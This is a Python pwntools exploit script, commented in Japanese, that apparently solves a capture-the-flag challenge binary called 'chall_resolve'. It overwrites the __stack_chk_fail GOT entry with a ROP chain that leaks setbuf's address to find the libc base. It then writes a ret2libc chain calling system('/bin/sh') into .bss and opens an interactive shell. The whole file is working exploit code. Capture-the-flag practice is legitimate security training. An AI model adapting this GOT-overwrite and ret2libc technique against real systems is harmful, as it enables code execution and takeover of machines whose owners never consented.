#!/usr/bin/env python3
from pwn import *

bin_file = './chall_resolve'
context(os = 'linux', arch = 'amd64')
# context(terminal = ['tmux', 'splitw', '-v'])
# context.log_level = 'debug'

binf = ELF(bin_file)
addr_main           = binf.functions['main'].address    # main()のアドレス
addr_got_setbuf     = binf.got['setbuf']                # GOTテーブル:setbuf()のアドレス
addr_got_scf        = binf.got['__stack_chk_fail']      # GOTテーブル:__stack_chk_fail()のアドレス
addr_bss            = binf.bss()                        # GOTテーブル:.bssセクションの先頭アドレス

libc = binf.libc
offset_libc_setbuf  = libc.functions['setbuf'].address

# __stack_chk_fail() が実行されると .bssにジャンプ。.bssにsystem("/bin/bash")を書き込んでおき、シェルを起動
def attack(conn, **kwargs):
    # setbuf()のアドレスをリークして、main()を再実行するROPガジェットを作成
    rop = ROP(binf)                                              # './chall_resolve'からROPガジェットを探す
    rop.raw(rop.ret)                                             # ret 命令だけのガジェット
    rop.printf(addr_got_setbuf)                                  # setbuf()のアドレスを出力するガジェット
    rop.raw(rop.ret)                                             # ret 命令だけのガジェット
    rop.main()                                                   # main()を実行するガジェット

    # ROPガジェットを__stack_chk_fail()のアドレスに書き込む
    conn.sendlineafter('>> ', pack(0xdeadbeef) + bytes(rop))     # buf[0x10]にpack(0xdeadbeef)を書き込み、bytes(rop)をpに書き込みする
    conn.sendlineafter('>> ', str(hex(addr_got_scf)))            # __stack_chk_fail()のアドレスをROPチェーンの書き込み先に設定
    conn.sendafter('>> ', str(hex(rop.r12_r13_r14_r15.address))) # __stack_chk_fail()のアドレスに、関数呼び出しに必要なレジスタを設定
    conn.send(pack(0xcafebabe))                                  # スタックアラインメント

    # ここまでの処理で、__stack_chk_fail()のアドレスをROPチェーンに書き換えて、main()を再実行する

    # "/bin/sh" のアドレスを検索
    addr_libc_setbuf    = unpack(conn.recv(6), 'all')            # 6byteリーク(頭2byteは0)し、setbuf()のアドレス(バイナリ)を64ビットの整数に変換
    libc.address = addr_libc_setbuf - offset_libc_setbuf         # libcのベースアドレスを計算
    info('addr_libc_base = 0x{:08x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))          # libc バイナリ内から文字列 "/bin/sh" のアドレスを検索し、その先頭アドレスを取得

    # system("/bin/sh")を実行するROPチェーン作成
    rop = ROP(libc)                                              # libcからROPガジェットを探す
    rop.raw(rop.ret)                                             # ret 命令だけのガジェット
    #info(bytes(rop).hex())
    rop.system(addr_libc_str_sh)                                 # system("/bin/sh")のガジェット
    #info(bytes(rop).hex())

    # .bss にROPチェーンを書いて、そこへジャンプ(ret2libc)
    conn.sendlineafter('>> ', bytes(rop))                        # pにsystem("/bin/sh")を書き込みする
    conn.sendlineafter('>> ', str(hex(addr_bss)))                # p は .bss を指すようになる
    conn.sendlineafter('>> ', '0')                               # ダミー

def main():
    # conn = gdb.debug(bin_file)
    conn = process(bin_file)
    attack(conn)
    conn.interactive()

if __name__=='__main__':
    main()
